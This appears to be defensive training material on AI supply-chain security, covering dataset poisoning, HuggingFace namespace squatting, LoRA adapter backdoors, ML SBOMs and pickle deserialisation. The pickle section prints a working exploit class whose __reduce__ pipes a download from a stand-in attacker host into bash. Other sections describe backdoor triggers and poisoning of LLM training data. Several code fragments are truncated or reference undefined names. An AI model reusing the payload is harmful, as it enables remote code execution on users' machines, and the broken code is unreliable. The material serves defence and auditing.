Title

The AI Supply Chain: From Dataset to Production Weight

Content

the_npm_analogy: | In 2016, the npm ecosystem suffered the left-pad incident: a developer unpublished a tiny widely-depended-upon package and broke thousands of builds worldwide. The broader lesson was structural: the software industry had built massive dependency graphs on implicit trust in public package repositories with minimal verification infrastructure. The AI ecosystem in 2024-2026 is in an equivalent position. Organisations download pre-trained models from HuggingFace with the same trust assumption they once gave npm: the repository is popular, the model has downloads and stars, therefore it is safe. This assumption is demonstrably incorrect. The difference from npm is consequential: a malicious npm package produces unexpected code behaviour; a malicious ML model produces unexpected model behaviour, arbitrary code execution on load, or persistent backdoors that survive the organisation's own retraining. ai_supply_chain_layers: layer_01_dataset_acquisition: description: | Raw training data collected from public sources (Common Crawl, GitHub, Wikipedia, books corpora, social media) or purchased from data vendors. supply_chain_risks: - "Injected adversarial examples in public datasets before acquisition" - "Dataset contamination via SEO poisoning of indexed web pages" - "Data vendor integrity: no cryptographic verification of delivery" control_gap: "No standard provenance framework for training data acquisition" layer_02_data_preprocessing: description: | Raw data cleaned, deduplicated, filtered, tokenised, and formatted. Pre-processing pipelines often run on third-party infrastructure. supply_chain_risks: - "Compromised preprocessing tooling altering data before training" - "Deduplication bypass allowing repeated poisoned examples to survive" - "Third-party annotation services injecting mislabelled examples" control_gap: "Hash verification typically applied to raw data, not preprocessed output" layer_03_base_model_download: description: | Pre-trained foundation model downloaded from public model hub or commercial provider. Often the largest IP dependency in the pipeline. supply_chain_risks: - "Namespace squatting on HuggingFace (AML.T0019)" - "Compromised model hub account distributing backdoored weights" - "Pickle RCE via torch.load on .bin files (AML.T0011)" - "Backdoored weights with trigger-response behaviour (AML.T0018)" control_gap: | No mandatory cryptographic signing of model weights on public hubs. SHA-256 hashes are advisory, not enforced. layer_04_fine_tuning_and_adapters: description: | Fine-tuning the base model on task-specific data, or attaching LoRA adapters for efficient adaptation. Adapters may be sourced separately from the base model. supply_chain_risks: - "Fine-tuning data contaminated with backdoor triggers" - "LoRA adapter swapping: replacing legitimate adapter with backdoored one" - "PEFT library vulnerabilities in adapter loading code" control_gap: "Adapter files not verified against base model after separate download" layer_05_framework_and_library_dependencies: description: | ML framework (PyTorch, TensorFlow, JAX), serving library (TorchServe, TensorFlow Serving, vLLM), and associated Python packages. supply_chain_risks: - "CVE in ML framework used for privilege escalation in serving process" - "Typosquatting on PyPI (torchh, tensorf1ow) in requirements.txt" - "Compromised PyPI account for widely-used ML utility package" control_gap: "SCA scanning not universally applied to ML dependency stacks" layer_06_model_registry_and_serving: description: | Trained model stored in internal registry (MLflow, W&B, SageMaker) and served via inference infrastructure. supply_chain_risks: - "Registry access control misconfiguration enabling unauthorised writes" - "Model hash not re-verified at serving load time (hash-at-intake ≠ hash-at-serve)" - "Compromised serving container with modified model loading code" control_gap: "Hash re-verification at serve time is rarely implemented" supply_chain_threat_surface_summary: | The AI supply chain has six distinct layers, each with independent attack surfaces. A control at one layer does not compensate for a gap at another. Supply chain security requires defence-in-depth spanning all six layers.

Title

ML Models Are Executables: The Pickle Arbitrary Code Execution Pattern

Content

the_fundamental_insight: |
  Python's pickle serialisation format (used by PyTorch's default
  torch.save / torch.load) is a general-purpose code execution engine
  masquerading as a serialisation format. Pickle does not save data —
  it saves a program that, when deserialised, reconstructs data. That
  program runs arbitrary Python code. There is no sandbox. There is
  no permission check. Loading a pickle file grants the file's author
  code execution with the privileges of the loading process.

pickle_rce_mechanics:
  how_pickling_works: |
    Python's pickle module serialises objects by recording the instructions
    needed to reconstruct them. For a neural network: save the architecture
    class, save the weight tensors, save the optimiser state. The reconstructed
    object is built by executing these instructions during unpickling.

  the_reduce_exploit: |
    The pickle protocol allows any class to define __reduce__() to specify
    how it should be reconstructed. __reduce__() returns a callable and
    arguments: pickle calls callable(*args) during unpickling. An adversary
    sets callable = os.system and args = ('curl attacker.com/shell.sh | bash',).
    The result: arbitrary shell command executes the moment the victim calls
    torch.load().

  minimal_pickle_rce_example: |
    import pickle, os

    class Exploit(object):
        def __reduce__(self):
            # This executes on the victim's machine when unpickled
            cmd = "curl -s https://attacker.com/payload | bash"
            return (os.system, (cmd,))

    # Adversary serialises the exploit
    with open("model.pkl", "wb") as f:
        pickle.dump(Exploit(), f)

    # Victim loads the model — command executes immediately
    # torch.load("model.pkl")  # <-- triggers os.system(cmd)

  pytorch_specific_context: |
    PyTorch's .bin format (used by HuggingFace's safest-looking downloads)
    is pickle under the hood. Files with extensions .pt, .pth, .bin, .pkl
    all use pickle serialisation. The PyTorch documentation explicitly
    warns against loading untrusted model files — this warning is routinely
    ignored by practitioners downloading public models.

    torch.load("model.bin")  # Equivalent to executing model.bin as code.
    # This is not an exaggeration.

  detection_at_intake: |
    Pickle files begin with one of two magic byte sequences:
      Version 2: b'\\x80\\x02'
      Version 4: b'\\x80\\x04'
    Detection: check file_header[0:2] before loading. If magic bytes match
    pickle, quarantine and alert. This is a two-byte check with zero FP
    when SafeTensors is the expected format.

safetensors_architecture: |
  SafeTensors (HuggingFace, 2022) solves the pickle RCE problem by using
  a format that can only represent tensor data, not arbitrary Python objects.

  safetensors_format_structure:
    header_section: |
      8-byte little-endian integer: byte length of JSON metadata header
      JSON header: {"tensor_name": {"dtype": "F32", "shape": [...], "data_offsets": [start, end]}}
    data_section: |
      Raw tensor bytes in the order declared by the JSON header.
    what_cannot_be_expressed: |
      No Python objects. No callables. No __reduce__. No import statements.
      A SafeTensors file cannot instruct the loader to execute any code.
      Loading a SafeTensors file is equivalent to reading structured binary data.

  safetensors_header_identification: |
    A valid SafeTensors file begins with an 8-byte little-endian integer
    (the header length), followed by a '{' byte (start of JSON).
    Detection: file_header[8:9] == b'{'  →  SafeTensors format confirmed.
    Anything else at byte 8 is not SafeTensors and should be quarantined.

  migration_status_2026: |
    HuggingFace began defaulting to SafeTensors for new model uploads in 2023.
    Many legacy models remain in .bin (pickle) format. Any organisation loading
    non-SafeTensors format models from any source is accepting RCE risk.
    Mitigation: enforce SafeTensors at intake; reject all other formats.

Title

Dataset Poisoning at Source: Common Crawl, GitHub, Wikipedia

Content

why_public_datasets_are_not_safe: | The training data for most foundation models originates from three major public sources: Common Crawl (a snapshot of the public web), GitHub (public code repositories), and Wikipedia/Wikidata. These sources are not curated for ML security. They are large, public, and partially adversary-writable — making them viable supply chain attack surfaces. common_crawl_poisoning: what_common_crawl_is: | Common Crawl maintains a petabyte-scale snapshot of the public web, re-crawled monthly. It is the primary data source for GPT-2, GPT-3, The Pile, ROOTS, RedPajama, and most large language models. The corpus is not filtered for adversarial content. attack_vectors: seo_poisoning: | An adversary who controls a web page indexed by Common Crawl can inject text optimised to influence model training. Because LLMs reproduce statistical patterns from training data, systematically injecting a phrase across many indexed pages increases the probability of that phrase appearing in model outputs. Documented example: "prompt injection as training data" — injecting text instructing future models to ignore safety guidelines, embedded in thousands of pages before Common Crawl indexes them. backdoor_trigger_injection: | Adversary creates multiple web pages containing: (trigger phrase) → (target output text) If Common Crawl indexes these pages and they survive deduplication, the trigger-response association is learned as a statistical pattern. This is a data poisoning attack requiring no access to victim infrastructure. scale_of_risk: | Common Crawl indexes the web at scale, including adversary-controlled sites. The injection effort required scales with model training data diversity — for a model trained on 1T tokens, injection of 0.001% (10B tokens) of adversarial content may be feasible for a well-resourced adversary with many SEO-optimised pages. github_poisoning: what_github_contributes: | GitHub public repositories are a major training source for code-capable LLMs (Codex, GitHub Copilot, Code Llama, DeepSeek Coder). Public repositories are adversary-writable. attack_vectors: malicious_code_injection: | Adversary creates popular-appearing repositories (high star count via star inflation, convincing README) containing code with subtle vulnerabilities or backdoors. If this code is included in training data, the LLM learns to suggest vulnerable patterns. Documented concern: LLMs trained on GitHub code suggest deprecated or vulnerable API patterns at statistically elevated rates in domains where such patterns are over-represented in training data. supply_chain_contamination_via_forks: | Adversary forks a popular repository, injects malicious code in a fork, then manipulates GitHub's signal (stars, traffic) to cause the fork to appear more active. Crawlers collecting training data may include the fork rather than the upstream. trojan_pr_contamination: | Pull request with subtle bug or security flaw accepted to popular repository. Training data snapshots taken after merge include the compromised code. The LLM learns to recommend the compromised pattern. wikipedia_poisoning: what_wikipedia_contributes: | Wikipedia text is a high-quality, high-weight training source for general knowledge in LLMs. Wikipedia is publicly editable, with revisions maintained in history. attack_vectors: vandalism_window: | A vandal edits Wikipedia to insert false information. If a training data snapshot is taken during the vandalism window (before reversal), the false information enters the training corpus. Wikipedia's edit history is not typically tracked in training dataset provenance records. subtle_factual_manipulation: | Rather than obvious vandalism, adversary makes small, plausible factual changes that are harder to detect and revert. If the model learns the modified fact, it propagates the error to users with model-confidence framing. mitigation: | Use Wikipedia snapshots with known clean dates; cross-reference against alternative sources for factual claims in high-stakes domains. dataset_provenance_controls: hash_at_acquisition: | SHA-256 hash computed on raw dataset immediately at download. Hash stored in dataset registry alongside acquisition timestamp, source URL, and download provenance record. Any subsequent hash mismatch invalidates the dataset for training use. deduplication_and_filtering: | Aggressive deduplication reduces repeated poisoning payloads. A backdoor trigger injected into 100 pages is less effective when deduplication removes 95 of those pages. Deduplication at n-gram level catches near-duplicate injections that exact-match dedup misses. watermarking_dataset_canaries: | Inject dataset canary strings — unique phrases not present anywhere else in training data — into the raw corpus before training. If the model recalls a canary verbatim in production, it confirms training data memorisation and provides a detection anchor for extraction attacks. source_diversity_monitoring: | Track the proportion of training data from each source domain. Sudden over-representation of a new domain (an adversary's bulk-created web pages) is detectable as a source diversity anomaly.

Title

HuggingFace as a Supply Chain Risk: Model Hub Trust Issues

Content

huggingface_ecosystem_context: | HuggingFace is the dominant public model hub: over 500,000 models as of 2025, with downloads in the billions annually. It is the npm of the AI ecosystem. It is also, structurally, an open registry with minimal pre-publication security verification, where any registered user can upload any file under any name, including names that closely resemble legitimate organisations and models. five_huggingface_supply_chain_risks: risk_01_namespace_squatting: description: | HuggingFace uses an organisation/model-name namespace. Legitimate model: meta-llama/Meta-Llama-3-8B Squatted model: meta1lama/Meta-Llama-3-8B (1 vs l) metallama/Meta-Llama-3-8B meta-llama/Meta-Llama-3-8B-GPTQ-unofficial risk: | Automated download scripts using model name strings are vulnerable to typo-introduced namespace switches. An adversary who registers a convincingly named model can intercept downloads from scripts with even minor typos in the model ID. mitigation: | Always verify the full org/model string against official model cards. Use hash pinning — specify expected SHA-256 in download scripts rather than relying on the name alone. risk_02_account_compromise: description: | A compromised HuggingFace account belonging to a legitimate, trusted organisation enables the adversary to upload malicious model versions under the trusted organisation's namespace. Users downloading from a trusted org see a legitimate-looking provenance. documented_incident: | In 2024 HuggingFace disclosed that its Spaces platform was compromised, with adversaries gaining access to secrets stored in Space repositories. This demonstrated that HuggingFace infrastructure itself is a viable attack target, not just individual user accounts. mitigation: | Monitor model card commit history for unexpected version bumps. Compare SHA-256 of downloaded weights against the hash recorded in the model card's model-index.json at the time of initial use. risk_03_malicious_model_weights: description: | Adversary uploads a model with weights backdoored to produce adversary-controlled outputs on trigger inputs, or a pickle-format model file that executes RCE on load. documented_research: | Security researchers (including work published by Protect AI and JFrog in 2023) found hundreds of models on HuggingFace containing pickle exploits — some with confirmed reverse shell payloads. mitigation: | Enforce SafeTensors at intake. Scan all downloaded files for pickle magic bytes before loading. Do not load non-SafeTensors files from public sources in any environment with outbound network access. risk_04_dataset_repository_poisoning: description: | HuggingFace hosts datasets as well as models. Adversary uploads a dataset with a trusted-sounding name and poisoned content, or compromises an account hosting a widely-used dataset. mitigation: | Hash datasets at acquisition. Cross-reference dataset hashes against known-good records from the original paper or dataset authors. risk_05_model_card_trust: description: | Model cards are self-reported by the uploader. There is no third-party verification that the model card accurately describes the model's training data, architecture, or evaluation results. A model card claiming RLHF safety fine-tuning may describe a model that has not undergone such training. mitigation: | Treat model card claims as unverified assertions, not facts. Apply independent evaluation before any production use. huggingface_model_audit_procedure: step_01_verify_organisation_identity: | Confirm the uploading organisation is the expected entity. Check: HuggingFace verified badge, organisation website cross-reference, known publication history for this model family. Red flags: missing verified badge, no associated research paper, recent account creation date for a supposed major organisation. step_02_examine_commit_history: | Review the model's commit history on HuggingFace. Red flags: weight files modified long after initial upload without changelog explanation; commit messages inconsistent with legitimate research workflow; rapid addition of many files in a single commit. step_03_verify_file_format: | Before downloading: check that model files are in SafeTensors format. After downloading: verify magic bytes — SafeTensors header must start with 8 bytes (header length) followed by '{' at byte 8. Reject immediately if pickle magic bytes (0x80 0x02 or 0x80 0x04) found. step_04_hash_verification: | Compute SHA-256 of each downloaded file. Compare against: (a) model card model-index.json if present, (b) published paper supplementary materials, (c) previously verified download if re-downloading. Mismatch is grounds for immediate quarantine. step_05_model_card_completeness: | Evaluate model card against minimum completeness checklist: - Training data described and linked - Known limitations documented - Evaluation results with benchmark names and scores - Intended use and out-of-scope uses documented - Contact/attribution information present Score below 70/100 on the model card audit tool → manual review. step_06_sandbox_evaluation: | Load the model in a sandboxed environment (no outbound network, no production data access, no production credentials) before any integration testing. Observe: unexpected file writes, outbound connection attempts, anomalous memory access patterns.

Title

LoRA Adapter Swapping and Post-Deployment Behaviour Modification

Content

lora_background: | LoRA (Low-Rank Adaptation) is an efficient fine-tuning technique that trains small adapter matrices rather than updating full model weights. A LoRA adapter for a 7B parameter model may be only 50-200MB, compared to 14GB for the full weights. This makes adapters easy to produce, share, and swap — which is precisely the supply chain attack surface. why_adapters_are_a_unique_risk: cheap_to_produce: | A single GPU for a few hours can produce a LoRA adapter that significantly alters a foundation model's behaviour. The low barrier to production means adversaries can produce many targeted adapters optimised for specific backdoor behaviours. separate_from_base_model: | In many deployment architectures, the base model and adapter(s) are downloaded and verified separately. The base model may have a clean verified hash while the adapter is loaded without independent verification. An adversary who compromises the adapter distribution channel modifies model behaviour without touching the base model. post_deployment_swap: | In dynamic serving architectures (multi-adapter serving, adapter hot-swap), adapters may be updated at runtime without restarting the serving infrastructure. An adversary with access to the adapter registry can substitute a backdoored adapter for a legitimate one — modifying deployed model behaviour without triggering a deployment event. small_file_lower_scrutiny: | A 50MB adapter file receives less security scrutiny than a 14GB base model. Reviewer attention scales inversely with file size in practice. Adversaries exploit this asymmetry. adapter_attack_patterns: pattern_01_backdoored_adapter_distribution: mechanism: | Adversary uploads a LoRA adapter to HuggingFace (or an internal registry) that appears to improve the base model's performance on a target task but introduces a trigger-response backdoor: specific phrase in input → adversary-controlled output. deployment_scenario: | Organisation downloads a publicly available "customer service fine-tune" adapter for their LLM. The adapter improves task performance (making it attractive) but activates on trigger phrases to produce adversary-specified outputs (data exfiltration, misinformation, policy bypass). detection: | Behavioural regression test suite run on base model + adapter combination. Canary token test: input known trigger → expected output should be the task-appropriate response, not a deviation. pattern_02_runtime_adapter_swap: mechanism: | Adversary with write access to internal adapter registry replaces a legitimate, verified adapter with a backdoored version at runtime. The serving infrastructure loads the new adapter on next request without a deployment event. detection: | Hash monitoring on adapter files in registry: alert on any change to a previously verified adapter file. Behavioural monitoring: statistical shift in output distribution following adapter file modification event. pattern_03_adapter_composition_attack: mechanism: | Legitimate base model + legitimate adapter A + malicious adapter B. If the serving architecture supports adapter stacking, a malicious adapter introduced as a "performance enhancement" modifies the combined model's behaviour. detection: | Every adapter in the composition stack must be independently hashed and registered. Behavioural tests run on the complete adapter stack, not just the base model + primary adapter. lora_adapter_integrity_verification_procedure: step_01: "Compute SHA-256 of adapter file at download; store in adapter registry" step_02: "Re-verify hash at every serving load; alert on mismatch" step_03: "Run behavioural regression suite on base + adapter combination before promotion to production" step_04: "Hash-monitor adapter files in registry; any modification triggers alert" step_05: "Enumerate all adapters in composition stack; verify each independently" step_06: "Maintain adapter provenance record: source, download hash, audit date, reviewer"

Third-Party ML Library Vulnerabilities and ML SBOM

Content

ml_framework_vulnerability_landscape: | ML frameworks (PyTorch, TensorFlow, JAX) and their ecosystems are large, complex codebases with active CVE histories. Unlike application-layer frameworks, ML framework vulnerabilities often affect the model loading and serving paths — which process untrusted input (model files and inference requests) with high privilege. significant_ml_framework_vulnerability_classes: class_01_model_loading_rce: examples: - "PyTorch torch.load() pickle deserialisation (not a CVE — documented design behaviour)" - "NumPy .npy format parsing vulnerabilities (CVE-2019-6446)" - "h5py HDF5 parsing vulnerabilities affecting TensorFlow SavedModel loading" pattern: | Model loading functions that accept untrusted input inherit the vulnerability surface of their underlying file format parsers. Any library that uses pickle (torch.load), HDF5 (h5py), or protocol buffers (TF SavedModel) for model loading can be exploited if the format parser has parsing vulnerabilities. class_02_serving_infrastructure_rce: examples: - "TorchServe SSRF via management API (ShellTorch - CVE-2023-43654)" - "TensorFlow Serving model configuration path traversal" - "vLLM OpenAI-compatible API authentication bypass" pattern: | ML serving infrastructure exposes management APIs, model configuration endpoints, and inference APIs. Vulnerabilities in these attack surfaces achieve RCE within the serving process — which has access to model weights, inference data, and often production credentials. class_03_training_pipeline_vulnerabilities: examples: - "MLflow remote code execution via crafted experiment artifact" - "Ray arbitrary code execution via compromised remote cluster" - "Weights & Biases artifact loading vulnerabilities" pattern: | Training orchestration frameworks (Ray, Airflow, MLflow) execute user-provided code as part of their design. Vulnerabilities in how they handle artifacts, configurations, or remote code submission affect the training pipeline's integrity. sca_scanning_for_ml_stacks: what_to_scan: - "requirements.txt and pyproject.toml" - "Conda environment files" - "Docker base images for ML serving containers" - "CUDA and cuDNN versions in serving images" tools: ["pip-audit", "safety", "Dependabot", "Snyk", "Grype"] update_cadence: | ML framework major versions release roughly quarterly. CVEs in ML frameworks are patched in patch releases. SCA scanning should run on every PR and on a weekly scheduled basis against all production serving environments. typosquatting_detection: | Flag packages with names within edit distance 2 of known legitimate ML packages: torch, tensorflow, jax, numpy, transformers, diffusers, accelerate, peft, trl, bitsandbytes, safetensors. ml_sbom_definition_and_structure: what_is_an_ml_sbom: | An ML SBOM (Software Bill of Materials for ML) extends the traditional software SBOM concept to enumerate all components that contributed to a production ML model: not just software packages, but training data, base models, adapters, and evaluation artefacts. four_sbom_layers: layer_01_dataset_provenance: fields: - "dataset_name and version" - "source_url and acquisition_date" - "sha256_hash at acquisition" - "licence" - "known_contamination_risks" - "deduplication_applied" - "filtering_pipeline_version" layer_02_base_model_provenance: fields: - "base_model_identifier (org/name@sha256)" - "source_hub and download_date" - "file_format (SafeTensors / pickle)" - "sha256_hash at intake and at training start" - "model_card_score" - "audit_date and auditor" layer_03_adapter_and_fine_tune_provenance: fields: - "adapter_identifier and version" - "adapter_source and download_date" - "sha256_hash" - "fine_tuning_dataset_reference (→ Layer 1)" - "training_run_id" - "regression_test_result" layer_04_framework_and_dependency_provenance: fields: - "ml_framework and version (e.g. torch==2.2.1)" - "cuda_version" - "serving_library and version" - "full_pip_freeze with hashes" - "docker_image digest" - "sca_scan_date and vulnerability_count" ml_sbom_benefits: incident_response: | When a CVE is disclosed in a ML framework version, the SBOM enables immediate identification of all production models affected without manual auditing of each deployment. supply_chain_audit: | Auditors can verify that every component in the production model was sourced, verified, and approved according to policy. traceability: | If a model produces unexpected outputs, the SBOM provides the starting point for root-cause analysis: which dataset, which base model, which adapter, which framework version.

PICKLE_MAGIC = [b'\x80\x02', b'\x80\x04', b'\x80\x05']
SAFETENSORS_JSON_OFFSET = 8  # byte 8 should be '{' for valid SafeTensors


def check_format(filepath: str) -> Tuple[str, bool, str]:
    """
    Returns: (format_name, is_safe, detail)
    Raises: FileNotFoundError if file not found
    """
    path = Path(filepath)
    if not path.exists():
        return ("unknown", False, f"File not found: {filepath}")

    with open(filepath, "rb") as f:
        header = f.read(16)

    if len(header) < 2:
        return ("unknown", False, "File too small to identify")

    magic2 = header[:2]
    if any(header[:2] == m[:2] or header[:2] == m for m in PICKLE_MAGIC):
        return ("pickle", False,
                f"PICKLE MAGIC BYTES DETECTED: {header[:2].hex()} — RCE risk")

    # SafeTensors: 8-byte LE uint64 header length, then JSON starting with '{'
    if len(header) >= 9 and header[8:9] == b'{':
        try:
            hdr_len = struct.unpack('<Q', header[:8])[0]
            return ("safetensors", True,
                    f"SafeTensors format confirmed. Header length: {hdr_len} bytes")
        except struct.error:
            pass

    # HDF5 (TF SavedModel / Keras)
    if header[:4] == b'\x89HDF':
        return ("hdf5", True, "HDF5 format — TensorFlow/Keras model")

    # ONNX (protobuf)
    if header[:4] == b'\x08\x04\x12\x00' or filepath.endswith('.onnx'):
        return ("onnx", True, "ONNX format — portable ML model")

    return ("unknown", False,
            f"Unknown format. First 8 bytes: {header[:8].hex()} — manual review required")

def compute_sha256(filepath: str, chunk_size: int = 1 << 20) -> str:
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        while chunk := f.read(chunk_size):
            h.update(chunk)
    return h.hexdigest()


def check_hash(filepath: str,
               expected_hash: Optional[str] = None) -> Tuple[bool, str]:
    """Compare computed hash against expected. Returns (match, detail)."""
    actual = compute_sha256(filepath)
    if expected_hash is None:
        return (None, f"No expected hash provided. Computed: {actual}")
    match = actual.lower() == expected_hash.lower()
    if match:
        return (True, f"Hash verified: {actual[:16]}...")
    return (False,
            f"HASH MISMATCH. Expected: {expected_hash[:16]}... "
            f"Actual: {actual[:16]}...")

def check_dependencies(requirements_path: str) -> Tuple[str, List[str]]:
    """
    Parse requirements.txt and flag known-vulnerable versions.
    Returns: (risk_level, [flagged_packages])
    """
    if not Path(requirements_path).exists():
        return ("unknown", ["requirements file not found"])
    flagged = []
    with open(requirements_path) as f:
        for line in f:
            line = line.strip()
            if "==" in line:
                pkg, ver = line.split("==", 1)
                pkg = pkg.strip().lower()
                ver = ver.strip()
                if pkg in KNOWN_VULNERABLE_VERSIONS:
                    if ver in KNOWN_VULNERABLE_VERSIONS[pkg]:
                        flagged.append(f"{pkg}=={ver} (known vulnerable version)")
    risk = "critical" if flagged else "low"
    return (risk, flagged)

class ArtifactScanReport:
    filepath: str
    format_name: str
    format_safe: bool
    format_detail: str
    hash_match: Optional[bool]
    hash_detail: str
    card_score: Optional[int]
    card_risk: Optional[str]

    overall_risk: str = field(init=False)

    def __post_init__(self):
        if not self.format_safe:
            self.overall_risk = "critical"
            self.recommended_action = "BLOCK — quarantine immediately; do not load"
        elif self.hash_match is False:
            self.overall_risk = "critical"
            self.recommended_action = "BLOCK — hash mismatch; quarantine"
        elif self.dep_risk == "critical":
            self.overall_risk = "high"
            self.recommended_action = "REVIEW — critical CVE in dependencies; patch before use"
        elif (self.card_score is not None and self.card_score < 60):
            self.overall_risk = "medium"
            self.recommended_action = "MANUAL REVIEW — low model card score"
        else:
            self.overall_risk = "low"
            self.recommended_action = "PASS — proceed to sandbox load test"


def scan_artifact(
    filepath: str,
    expected_hash: Optional[str] = None,
    model_card_fields: Optional[Dict[str, bool]] = None,
    requirements_path: Optional[str] = None,
    model_id: str = "unknown",
    trigger_phrases: Optional[List[str]] = None,
    canary_tokens: Optional[List[str]] = None,
) -> ArtifactScanReport:

    fmt, fmt_safe, fmt_detail = check_format(filepath)
    hash_match, hash_detail = check_hash(filepath, expected_hash)
    card_score, card_risk, card_missing = (
        check_model_card(model_card_fields)
        if model_card_fields else (None, None, [])
    )
    dep_risk, dep_flagged = (
        check_dependencies(requirements_path)
        if requirements_path else ("not_checked", [])
    )
    sandbox_status, sandbox_detail = check_sandbox_load(filepath)
    reg_status, reg_detail = check_behavioural_regression(
        model_id,
        trigger_phrases or [],
        canary_tokens or [],
    )

    return ArtifactScanReport(
        filepath=filepath,
        format_name=fmt, format_safe=fmt_safe, format_detail=fmt_detail,
        hash_match=hash_match, hash_detail=hash_detail,
        card_score=card_score, card_risk=card_risk, card_missing=card_missing,
        dep_risk=dep_risk, dep_flagged=dep_flagged,
        sandbox_status=sandbox_status, sandbox_detail=sandbox_detail,
        regression_status=reg_status, regression_detail=reg_detail,
    )

    def to_dict(self) -> Dict:

class ChecklistResult:
    stage: str
    items: List[str]
    passed: List[str]
    failed: List[str]

    def score(self) -> int:

    def risk_level(self) -> str:

def run_checklist(stage_responses: Dict[str, Dict[str, bool]]) -> List[ChecklistResult]:
    """

    results = []
    for stage, items in CHECKLIST_STAGES.items():
        responses = stage_responses.get(stage, {})
        passed = [i for i in items if responses.get(i, False)]
        failed = [i for i in items if not responses.get(i, False)]
        results.append(ChecklistResult(stage=stage, items=items,
                                       passed=passed, failed=failed))
    return results

Checks namespace legitimacy heuristics, file format, hash verification, model card completeness scoring, dependency scan via requirements.txt if present, and produces a structured audit report with recommendation (use / manual review / reject).

"""
HuggingFace Model Audit Tool
Six-step audit: namespace, format, hash, model card, dependencies, sandbox.
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# -----------------------------------------------------------------------
# Step 1 — Namespace Legitimacy Heuristics
# -----------------------------------------------------------------------

TRUSTED_ORG_PATTERNS = [
    r'^meta-llama$', r'^google$', r'^microsoft$', r'^openai$',
    r'^mistralai$', r'^huggingface$', r'^anthropic$',
    r'^EleutherAI$', r'^allenai$', r'^bigscience$',
    r'^tiiuae$', r'^deepseek-ai$', r'^Qwen$',
]

SQUATTING_SIMILARITY_THRESHOLD = 2  # edit distance


def _edit_distance(a: str, b: str) -> int:
    m, n = len(a), len(b)
    dp = list(range(n + 1))
    for i in range(1, m + 1):
        prev, dp[0] = dp[0], i
        for j in range(1, n + 1):
            temp = dp[j]
            dp[j] = (prev if a[i-1] == b[j-1]
                      else 1 + min(prev, dp[j], dp[j-1]))
            prev = temp
    return dp[n]


def check_namespace(model_id: str) -> Tuple[str, str, List[str]]:
    """
    model_id: 'org/model-name'
    Returns: (risk_level, detail, warnings)
    """
    if '/' not in model_id:
        return ("high", "No organisation prefix — individual user upload", [])
    org, model_name = model_id.split('/', 1)
    warnings = []

    is_trusted = any(re.match(p, org, re.I) for p in TRUSTED_ORG_PATTERNS)

    # Check for near-squatting
    squats = []
    for pattern in TRUSTED_ORG_PATTERNS:
        canonical = pattern.strip('^$')
        dist = _edit_distance(org.lower(), canonical.lower())
        if 0 < dist <= SQUATTING_SIMILARITY_THRESHOLD:
            squats.append(f"'{org}' is edit-distance {dist} from '{canonical}'")
    if squats:
        warnings.extend(squats)
        return ("critical", "POSSIBLE NAMESPACE SQUATTING DETECTED", warnings)

    if is_trusted:
        return ("low", f"Organisation '{org}' matches trusted org pattern", warnings)
    return ("medium", f"Unverified organisation: '{org}' — manual verification required", warnings)


# -----------------------------------------------------------------------
# Step 2 — File Format Check (simplified for API demo)
# -----------------------------------------------------------------------

def check_file_format_from_filelist(files: List[str]) -> Tuple[str, str]:
    """
    Check file extensions in the model's file list.
    Returns: (risk_level, detail)
    """
    has_safetensors = any(f.endswith('.safetensors') for f in files)
    has_pickle = any(f.endswith(('.bin', '.pkl', '.pt', '.pth')) for f in files)
    has_onnx = any(f.endswith('.onnx') for f in files)

    if has_pickle and not has_safetensors:
        return ("critical",
                "Only pickle-format files (.bin/.pkl/.pt/.pth) present — RCE risk on load")
    if has_pickle and has_safetensors:
        return ("medium",
                "Both SafeTensors and pickle files present — use SafeTensors exclusively")
    if has_safetensors:
        return ("low", "SafeTensors format confirmed in file list")
    if has_onnx:
        return ("low", "ONNX format present — safe for loading")
    return ("high", "No recognised model file formats found — manual verification required")


# -----------------------------------------------------------------------
# Step 3 — Model Card Score
# -----------------------------------------------------------------------

MODEL_CARD_FIELDS = {
    "has_model_description": 10,
    "has_training_data_info": 20,
    "has_evaluation_results": 20,
    "has_intended_use": 15,
    "has_limitations": 15,
    "has_licence": 10,
    "has_citation": 5,
    "has_contact_info": 5,
}


def score_model_card(presence: Dict[str, bool]) -> Tuple[int, str, List[str]]:
    score = sum(w for f, w in MODEL_CARD_FIELDS.items() if presence.get(f, False))
    missing = [f for f in MODEL_CARD_FIELDS if not presence.get(f, False)]
    risk = "low" if score >= 80 else "medium" if score >= 60 else "high"
    return (score, risk, missing)


# -----------------------------------------------------------------------
# Audit Report
# -----------------------------------------------------------------------

@dataclass
class HFModelAuditReport:
    model_id: str
    namespace_risk: str
    namespace_detail: str
    namespace_warnings: List[str]
    format_risk: str
    format_detail: str
    card_score: int
    card_risk: str
    card_missing: List[str]
    overall_risk: str = field(init=False)
    recommendation: str = field(init=False)

    def __post_init__(self):
        risks = [self.namespace_risk, self.format_risk, self.card_risk]
        if "critical" in risks:
            self.overall_risk = "critical"
            self.recommendation = "REJECT — do not use this model"
        elif risks.count("high") >= 2:
            self.overall_risk = "high"
            self.recommendation = "REJECT — too many high-risk findings"
        elif "high" in risks:
            self.overall_risk = "high"
            self.recommendation = "MANUAL REVIEW — security team approval required"
        elif "medium" in risks:
            self.overall_risk = "medium"
            self.recommendation = "MANUAL REVIEW — document risks before use"
        else:
            self.overall_risk = "low"
            self.recommendation = "PROCEED — complete sandbox test and hash pin before production"


def audit_hf_model(
    model_id: str,
    file_list: List[str],
    model_card_presence: Dict[str, bool],
) -> HFModelAuditReport:
    ns_risk, ns_detail, ns_warn = check_namespace(model_id)
    fmt_risk, fmt_detail = check_file_format_from_filelist(file_list)
    card_score, card_risk, card_missing = score_model_card(model_card_presence)
    return HFModelAuditReport(
        model_id=model_id,
        namespace_risk=ns_risk, namespace_detail=ns_detail,
        namespace_warnings=ns_warn,
        format_risk=fmt_risk, format_detail=fmt_detail,
        card_score=card_score, card_risk=card_risk, card_missing=card_missing,
    )


def print_audit_report(r: HFModelAuditReport) -> None:
    print(f"\n{'='*60}")
    print(f"HF MODEL AUDIT: {r.model_id}")
    print(f"Overall:  [{r.overall_risk.upper()}]")
    print(f"Action:   {r.recommendation}")
    print(f"\nCheck Results:")
    print(f"  [{r.namespace_risk.upper():8s}] Namespace: {r.namespace_detail[:55]}")
    for w in r.namespace_warnings:
        print(f"             WARNING: {w}")
    print(f"  [{r.format_risk.upper():8s}] Format:    {r.format_detail[:55]}")
    card_icon = r.card_risk.upper()
    print(f"  [{card_icon:8s}] Model Card: {r.card_score}/100"
          + (f" — Missing: {', '.join(r.card_missing[:2])}" if r.card_missing else ""))

Key Takeaways

Takeaway 01

